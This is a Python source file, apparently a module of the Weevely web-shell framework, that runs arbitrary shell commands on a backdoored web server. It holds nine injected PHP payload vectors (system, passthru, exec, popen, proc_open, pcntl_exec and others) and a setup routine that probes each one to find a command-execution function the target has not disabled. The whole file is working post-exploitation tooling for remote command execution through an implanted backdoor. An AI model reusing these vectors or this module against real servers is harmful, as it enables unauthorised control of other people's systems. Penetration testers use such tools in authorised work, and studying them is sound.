from core.vector import Os, Vector
from core.module import Module
from core.loggers import log
from core import messages
from core import modules
import random


class Sh(Module):

    """Execute Shell commands.

    Usage:
      shell_sh <command>

    """

    def initialize(self):

        self._register_infos(
            {
                'name': 'System Shell',
                'description': __doc__,
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory arguments
            arguments=[
                'command'
            ],
            # Declare additional options
            options={
                'stderr_redirection': ' 2>&1',
                'vector': ''
            })

        self._register_vectors(
            [
                Vector("""@system("${args['command']}${args['stderr_redirection']}");""", "system"),
                Vector("@passthru('${args['command']}${args['stderr_redirection']}');", "passthru"),
                Vector("print(@shell_exec('${args['command']}${args['stderr_redirection']}'));", "shell_exec"),
                Vector("$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));", "exec"),
                Vector("$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }", "popen"),
                Vector("""$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }""", "proc_open"),
                Vector("@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');", "python_eval"),
                Vector("if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}'); print($r); }", "perl_system"),
                # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
                Vector("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c","${args['command']}"));} else {@pcntl_waitpid($p,$status);}""",
                    name="pcntl", target=Os.NIX),
            ])


    

    def setup(self, args={}):
        """Probe all vectors to find a working system-like function.

        The method run_until is not used due to the check of shell_sh
        enabling.

        Args:
            args: The dictionary of arguments

        Returns:
            Returns true or false if the module is enable or not.

        """

        check_digits = str(random.randint(11111, 99999))

        args_check = { 'args' : {
                            'command': 'echo %s' % check_digits,
                            'stderr_redirection': ''
                        }
                    }
        
        for vector in self.vectors:

            # If a vector is explicitly set, just use that
            selected_vector = args['vector']
            if selected_vector and selected_vector != vector.name:
                continue 

            result = vector.run(values = args_check)
            
            if result == check_digits: 
                self._store_arg('vector', vector.name)
                return True
            else:
                # If a vector fails, check if at least shell_php is enabled.
                # If not the backdoor communication is missing, and return
                # immediatly.
                if not self.session['shell_php'].get('enabled'):
                    return False

        return False
        

    def run(self, args):
        
        return self._run_vector(args['vector'], { 'args' : args })
